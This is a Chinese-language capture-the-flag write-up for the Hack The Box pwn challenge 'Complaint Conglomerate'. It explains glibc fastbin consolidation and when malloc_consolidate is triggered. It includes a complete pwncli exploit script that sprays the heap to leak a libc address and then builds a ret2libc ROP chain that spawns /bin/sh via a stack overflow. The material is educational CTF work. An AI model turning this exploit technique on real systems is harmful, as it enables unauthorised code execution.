# 分析 fastbin chunk 合并的流程与触发时机：HTB pwn - Complaint Conglomerate-先知社区

> **来源**: https://xz.aliyun.com/news/16499  
> **文章ID**: 16499

---

## 前言

一个比较新的题目，来自 HTB Challenge的 medium 难度的题目

本题目结合了堆的技巧和栈的漏洞，堆方面主要是触发fastbin chunk合并的时机和触发方式，栈则是常规的ret2libc拿shell的操作

本文结合题目和glibc源码分享一下fastbin chunk合并相关的内容

题目放在附件了，解压密码 hackthebox

## 题目情况

E Corp's greed and global domination leaves them with no shortage of enemies, from the rich and powerful to the very lowest of society. The governments of the modern world have no power over E Corp, but to maintain the pretence, they came to a truce long ago - E Corp would have all the control they could desire, but they would provide an illusion of power to the common man that made them seem accountable. The core of this sham is E Corp's Complaint system, though it is well known that little ever happens from it. Can you change that?

```
Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

```

## 逆向分析

main：

```
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  setup();
  while ( 1 )
    menu();
}

```

```
int menu()
{
  int result; // eax

  printf(
    "Welcome to E Corp Assistant. How can I help you today?\n"
    "\t1) Create a complaint\n"
    "\t2) Mark a complaint as closed\n"
    "\t3) View a complaint by ID\n"
    "\t4) Ask AI to view a complaint\n"
    "\t5) Exit\n"
    "\n"
    "> ");
  switch ( read_uint(&format_) )
  {
    case 1uLL:
      result = create_complaint();
      break;
    case 2uLL:
      result = delete_complaint();
      break;
    case 3uLL:
      result = view_complaint();
      break;
    case 4uLL:
      result = send_complaint_to_ai();
      break;
    case 5uLL:
      exit(0);
    default:
      result = puts("Please choose a valid choice!");
      break;
  }
  return result;
}

```

经典菜单题

选项1：可以指定索引位来保存申请的内存，可申请的大小只有0x30和0x50两种，可以输入内容，存在off by null的缺陷

```
int create_complaint()
{
  char *ptr; // rax
  char *ptr_; // [rsp+0h] [rbp-20h]
  unsigned __int64 uint; // [rsp+8h] [rbp-18h]
  unsigned __int64 idx; // [rsp+10h] [rbp-10h]
  int size; // [rsp+18h] [rbp-8h]

  puts(
    "In the interest of saving time, larger complaints are only viewed by the E Corp AI. If you want to increase the like"
    "lihood of it being viewed by a human, please use a compact complaint.\n");
  idx = read_uint("Enter new complaint ID: ");
  if ( idx > 0xF )
    return puts("Invalid complaint ID!");       // 最多16个
  uint = read_uint("Choose a complaint type - Compact (0) or Regular (1): ");
  if ( uint )                                   // 选择类型，只能申请0x30和0x50两种
  {
    size = 80;
    ptr = (char *)malloc(0x50uLL);
  }
  else
  {
    size = 48;
    ptr = (char *)malloc(0x30uLL);
  }
  ptr_ = ptr;
  complaints[idx] = ptr;
  printf("Enter complaint: ");
  fgets(ptr_, size, stdin);                     // 输入内容，offbynull？
  printf("Complaint successfully logged. ");
  if ( uint )
    printf("The E Corp AI");
  else
    printf("An administrator");
  return puts(" will assess the validity of your claim soon.\n");
}

```

选项2：释放指定的索引的chunk，没有清空指针，存在UAF的可能

```
int delete_complaint()
{
  unsigned __int64 uint; // [rsp+8h] [rbp-8h]

  puts(
    "Deleting complaints allows us to be more time-efficient and reply to those with actual importance. Thank you for tak"
    "ing the time to do so!\n");
  uint = read_uint("Enter complaint ID: ");
  if ( uint > 0xF )
    return puts("Invalid complaint ID!");
  free((void *)complaints[uint]);               // 没有清空指针，可能存在UAF
  return puts("Complaint successfully deleted! Thank you for helping E Corp increase productivity and meet its OKRs!");
}

```

选项3：显示指定索引的chunk的内容，UAF-Read

```
int view_complaint()
{
  unsigned __int64 uint; // [rsp+8h] [rbp-8h]

  puts(
    "We would like to reassure you that we are hard at work assessing your complaints - much as you should be hard at work!\n");
  uint = read_uint("Enter complaint ID: ");
  if ( uint <= 0xF )
    return puts((const char *)complaints[uint]);// 可以 UAF-Read
  else
    return puts("Invalid complaint ID!");
}

```

选项4：栈溢出的所在，将指定索引的chunk的内容复制到栈中，存在溢出

```
int send_complaint_to_ai()
{
  char dest[16]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 idx; // [rsp+10h] [rbp-10h]
  char n121; // [rsp+1Fh] [rbp-1h]

  printf("Would you like to trigger a viewing by the AI bot? (y/n)\n> ");
  n121 = getchar();
  getchar();
  if ( n121 != 'y' )
    return puts("AI viewing cancelled.\n");
  idx = read_uint("Enter complaint ID: ");
  if ( idx > 0xF )
    return puts("Invalid complaint ID!");
  memcpy(dest, (const void *)complaints[idx], 0x50uLL);// 栈溢出
  puts("AI is reviewing...");
  if ( (unsigned int)contains_rude_word(dest) ) // 不要出现指定的字符串
  {
    puts("RUDE WORD DETECTED, AI IS UNHAPPY");
    exit(1337);
  }
  sleep(1u);
  return puts("AI has checked it. Unfortunately, your complaint is invalid and has been ignored. Please leave a review!");
}

```

## 利用分析

程序能无限次申请内存，但是大小有限，只能是0x30和0x50

程序存在UAF-Read，可用于泄露地址

程序存在栈溢出，无canary，看上去让人非常想打ret2libc

思路应该就是泄露libc地址，然后栈溢出ret2libc拿shell，问题在于如何泄露libc地址

0x30和0x50大小的申请都是fastbin范围内的，那就只能想办法让fastbin chunk发生合并进入unsortedbin，从而泄露出libc地址

### 辅助函数

```
def cmd(i, prompt=b"> "):
    sla(prompt, i)

def add(idx:int,size:int,content:bytes):
    cmd('1')
    sla(b": ",str(idx).encode())
    sla(b": ",str(size).encode())
    sla(b": ",content)
    #......

def send_to_ai(idx:int):
    cmd('4')
    sla(b"\n> ",b"y")
    sla(b": ",str(idx).encode())

    #......

def show(idx:int):
    cmd('3')
    sla(b": ",str(idx).encode())
    #......

def dele(idx:int):
    cmd('2')
    sla(b": ",str(idx).encode())
    #......

```

### fastbin chunk 合并操作

基于`glibc/malloc/malloc.c`源码，合并`fastbin chunk`是通过`malloc_consolidate`函数完成的

```
static void malloc_consolidate(mstate av)
{
    mfastbinptr *fb;          /* current fastbin being consolidated */
    mfastbinptr *maxfb;       /* last fastbin (for loop control) */
    mchunkptr p;              /* current chunk being consolidated */
    mchunkptr nextp;          /* next chunk to consolidate */
    mchunkptr unsorted_bin;   /* bin header */
    mchunkptr first_unsorted; /* chunk to link to */

    /* These have same use as in free() */
    mchunkptr nextchunk;
    INTERNAL_SIZE_T size;
    INTERNAL_SIZE_T nextsize;
    INTERNAL_SIZE_T prevsize;
    int nextinuse;
    // 设置 av->have_fastchunks 为 false（0）
    atomic_store_relaxed(&av->have_fastchunks, false);
    // 取出 unsortedbin chunk
    unsorted_bin = unsorted_chunks(av);

    /*
      Remove each chunk from fast bin and consolidate it, placing it
      then in unsorted bin. Among other reasons for doing this,
      placing in unsorted bin avoids needing to calculate actual bins
      until malloc is sure that chunks aren't immediately going to be
      reused anyway.
      移除fastbin中的chunk，然后合并，放到unsortedbin

    */
    // 取出最大的 fastbin
    maxfb = &fastbin(av, NFASTBINS - 1);
    // 取出最小的 fastbin
    fb = &fastbin(av, 0);
    do
    {
        p = atomic_exchange_acq(fb, NULL);
        // 从最小的fb到最大的fb进行遍历，有chunk就进入处理
        if (p != 0)
        {
            // 遍历每一个 fastbin chunk
            do
            {
                {
                    // 安全检查：p 需要是内存对齐的
                    if (__glibc_unlikely(misaligned_chunk(p)))
                        malloc_printerr("malloc_consolidate(): "
                                        "unaligned fastbin chunk detected");
                    // 获取 fastbin 索引
                    unsigned int idx = fastbin_index(chunksize(p));
                    // 安全检查：该fastbin的大小检查，不能是其他大小
                    if ((&fastbin(av, idx)) != fb)
                        malloc_printerr("malloc_consolidate(): invalid chunk size");
                }
                // 检查 prev_inuse 位为 1
                check_inuse_chunk(av, p);
                // 解密 next 指针，拿到next chunk地址
                nextp = REVEAL_PTR(p->fd);

                /* Slightly streamlined version of consolidation code in free() */
                // 轻量线性版本的free()的consolidation
                // 获取大小
                size = chunksize(p);
                // 获取next chunk 及其 size
                nextchunk = chunk_at_offset(p, size);
                nextsize = chunksize(nextchunk);
                // 如果prev_inuse==0，意味着上一个chunk是空闲的normal chunk，向上（低地址）合并
                if (!prev_inuse(p))
                {
                    // 获取 prev_size，计算合并后大小 size，获取prev chunk ptr
                    prevsize = prev_size(p);
                    size += prevsize;
                    p = chunk_at_offset(p, -((long)prevsize));
                    // 安全检查：如果chunk size和next chunk 的 prev_size不一致，报错
                    if (__glibc_unlikely(chunksize(p) != prevsize))
                        malloc_printerr("corrupted size vs. prev_size in fastbins");
                    // 双链表断链 prev chunk
                    unlink_chunk(av, p);
                }
                // 如果下一个chunk不是top chunk
                if (nextchunk != av->top)
                {
                    // 判断再下一个chunk的prev_inuse
                    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

                    // 如果是0，表示next chunk是空闲的
                    if (!nextinuse)
                    {
                        // 大小合并，断链
                        size += nextsize;
                        unlink_chunk(av, nextchunk);
                    }
                    else    // 清除next chunk的prev_inuse位
                        clear_inuse_bit_at_offset(nextchunk, 0);

                    // 插入到 unsortedbin 的前面
                    // 取出unsortedbin中的第一个
                    first_unsorted = unsorted_bin->fd;
                    // 第一个设置成新的chunk
                    unsorted_bin->fd = p;
                    // 原本第一个的上一个设置成新的chunk
                    first_unsorted->bk = p;

                    // 如果是largebin size chunk，就清空nextsize位
                    if (!in_smallbin_range(size))
                    {
                        p->fd_nextsize = NULL;
                        p->bk_nextsize = NULL;
                    }
                    // 设置标志位，完成插入操作
                    set_head(p, size | PREV_INUSE);
                    p->bk = unsorted_bin;
                    p->fd = first_unsorted;
                    set_foot(p, size);
                }
                // 如果下一个chunk是top chunk
                else
                {   // 合并到top chunk
                    size += nextsize;
                    set_head(p, size | PREV_INUSE);
                    av->top = p;
                }

            } while ((p = nextp) != 0);
        }
    } while (fb++ != maxfb);
}

```

流程很长，可以参考我的注释，概括一下就是：

从最小的fastbin链表的第一个fastbin chunk开始循环：

1. 获取可用的fastbin chunk
2. 计算大小
3. 判断当前的prev\_inuse标志位是不是0

   1. 如果是0就和上一个chunk合并
   2. 如果是1就不进行合并
4. 判断下下个chunk的prev\_inuse是不是0，也就是下一个chunk是否是释放了的chunk

   1. 如果是就和下一个chunk合并
   2. 如果不是就不进行合并
5. 判断下一个chunk是不是top chunk

   1. 如果是就合并到top chunk里
6. 循环，检查下一个fastbin chunk

### fastbin chunk 合并的触发时机

在malloc申请内存的时候，`malloc_consolidate`有2个被调用的地方

第一个是在申请大小达到largebin范围的时候会触发fastbin合并：

```
/*
       If this is a large request, consolidate fastbins before continuing.
       While it might look excessive to kill all fastbins before
       even seeing if there is space available, this avoids
       fragmentation problems normally associated with fastbins.
       Also, in practice, programs tend to have runs of either small or
       large requests, but less often mixtures, so consolidation is not
       invoked all that often in most programs. And the programs that
       it is called frequently in otherwise tend to fragment.
     */

    else
    {
        // largebin 中取出
        idx = largebin_index(nb);
        if (atomic_load_relaxed(&av->have_fastchunks))
            malloc_consolidate(av);
    }

```

第二个是在使用top chunk的时候：当top chunk size小于申请的size时，且存在fastbin chunk，就会触发合并

```
use_top:

        // 获取top指针，计算chunk大小
        victim = av->top;
        size = chunksize(victim);
        // 申请的大小如果超过系统内存，报错
        if (__glibc_unlikely(size > av->system_mem))
            malloc_printerr("malloc(): corrupted top size");
        // 如果top chunk大小超过申请大小，继续
        if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE))
        {
...
        }

        /* When we are using atomic ops to free fast chunks we can get
           here for all block sizes.  */
        // 当使用原子操作来释放fast chunk，我们可以获取所有块大小
        else if (atomic_load_relaxed(&av->have_fastchunks))
        {
            malloc_consolidate(av); // 合并操作
            /* restore original bin index */
            // 保存原本bin索引
            if (in_smallbin_range(nb))
                idx = smallbin_index(nb);
            else
                idx = largebin_index(nb);
        }

```

### 触发fastbin合并

第一种方式无法达到，但是第二种方式有机会达到

```
for i in range(9):
    add(i,0,"add")

for i in range(2092):
    add(9,0,"emm")

for i in range(9):
    dele(i)

add(10,1,"11111111")

show(8)
leak = ru("\x7f\x0a")[-7:-1]
leak = u64(leak.ljust(8,b"\x00"))
libc.address = leak -0x1f6cc0
libc.address = leak -0x1d2cc0
success(f"leak libc: {hex(leak)}")
success(f"leak libc base: {hex(libc.address)}")

```

通过计算top chunk能装下多少个0x40的chunk（申请0x30的内存会变成0x40的chunk），申请完之后，剩下的空间肯定不足以申请0x60的chunk了

此时就会触发合并，合并后的结果：

```
0x55bc9edae290  0x0000000000000000      0x0000000000000041      ........A.......
0x55bc9edae2a0  0x000000055bc9edae      0xe0e11284bdd0a32c      ...[....,.......         <-- tcachebins[0x40][6/7]
0x55bc9edae2b0  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae2c0  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae2d0  0x0000000000000000      0x0000000000000041      ........A.......
0x55bc9edae2e0  0x000055b9c5130f0e      0xe0e11284bdd0a32c      .....U..,.......         <-- tcachebins[0x40][5/7]
0x55bc9edae2f0  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae300  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae310  0x0000000000000000      0x0000000000000041      ........A.......
0x55bc9edae320  0x000055b9c5130f4e      0xe0e11284bdd0a32c      N....U..,.......         <-- tcachebins[0x40][4/7]
0x55bc9edae330  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae340  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae350  0x0000000000000000      0x0000000000000041      ........A.......
0x55bc9edae360  0x000055b9c5130e8e      0xe0e11284bdd0a32c      .....U..,.......         <-- tcachebins[0x40][3/7]
0x55bc9edae370  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae380  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae390  0x0000000000000000      0x0000000000000041      ........A.......
0x55bc9edae3a0  0x000055b9c5130ece      0xe0e11284bdd0a32c      .....U..,.......         <-- tcachebins[0x40][2/7]
0x55bc9edae3b0  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae3c0  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae3d0  0x0000000000000000      0x0000000000000041      ........A.......
0x55bc9edae3e0  0x000055b9c5130e0e      0xe0e11284bdd0a32c      .....U..,.......         <-- tcachebins[0x40][1/7]
0x55bc9edae3f0  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae400  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae410  0x0000000000000000      0x0000000000000041      ........A.......
0x55bc9edae420  0x000055b9c5130e4e      0xe0e11284bdd0a32c      N....U..,.......         <-- tcachebins[0x40][0/7]
0x55bc9edae430  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae440  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae450  0x0000000000000000      0x0000000000000061      ........a.......
0x55bc9edae460  0x3131313131313131      0x00007f9119d4000a      11111111........
0x55bc9edae470  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae480  0x0000000000000000      0x0000000000000000      ................
0x55bc9edae490  0x0000000000000000      0x0000000000000041      ........A.......
0x55bc9edae4a0  0x00007f9119d4ecc0      0x00007f9119d4ecc0      ................
0x55bc9edae4b0  0x0000000000000000      0x0000000000000021      ........!.......         <-- unsortedbin[all][0]
0x55bc9edae4c0  0x00007f9119d4ecc0      0x00007f9119d4ecc0      ................

```

### ret2libc - drop shell

接下来就是写rop拿shell了：

```
rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh\x00")))

payload = cyclic(0x28) + rop.chain()
dele(10)
add(10,1,payload)
send_to_ai(10)

```

## 完整exp

```
#!/usr/bin/env python3
from pwncli import *
cli_script()


io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

def cmd(i, prompt=b"> "):
    sla(prompt, i)

def add(idx:int,size:int,content:bytes):
    cmd('1')
    sla(b": ",str(idx).encode())
    sla(b": ",str(size).encode())
    sla(b": ",content)
    #......

def send_to_ai(idx:int):
    cmd('4')
    sla(b"\n> ",b"y")
    sla(b": ",str(idx).encode())

    #......

def show(idx:int):
    cmd('3')
    sla(b": ",str(idx).encode())
    #......

def dele(idx:int):
    cmd('2')
    sla(b": ",str(idx).encode())
    #......

for i in range(9):
    add(i,0,"add")

for i in range(2092):
    add(9,0,"emm")

for i in range(9):
    dele(i)

add(10,1,"11111111")
pause()
show(8)
leak = ru("\x7f\x0a")[-7:-1]
leak = u64(leak.ljust(8,b"\x00"))
#libc.address = leak -0x1f6cc0
libc.address = leak -0x1d2cc0
success(f"leak libc: {hex(leak)}")
success(f"leak libc base: {hex(libc.address)}")

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh\x00")))

payload = cyclic(0x28) + rop.chain()
dele(10)
add(10,1,payload)
send_to_ai(10)
ia()

```

## 总结

主要是 fastbin chunk 合并的触发时机和触发方式

## 参考资料

* [Hack The Box :: Hack The Box](https://app.hackthebox.com/challenges/Complaint%2520Conglomerate)
